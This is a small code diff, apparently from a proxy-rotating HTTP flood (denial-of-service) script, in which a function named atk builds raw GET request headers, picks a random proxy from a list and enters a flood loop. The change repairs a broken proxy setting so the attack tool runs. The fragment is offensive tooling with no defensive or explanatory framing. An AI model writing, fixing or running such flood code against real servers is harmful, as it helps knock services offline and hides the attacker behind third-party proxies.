@@ -149,7 +149,7 @@ def atk():
 	rqs = get_host + useragent + accept + connection + "\r\n"
 	#pprr = open(list).readlines()
 	proxy = random.choice(pprr).strip().split(":")
-	socks.setdefaultproxy(PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True)
+	socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True)
 	time.sleep(5)
 	while True:
 		while on:
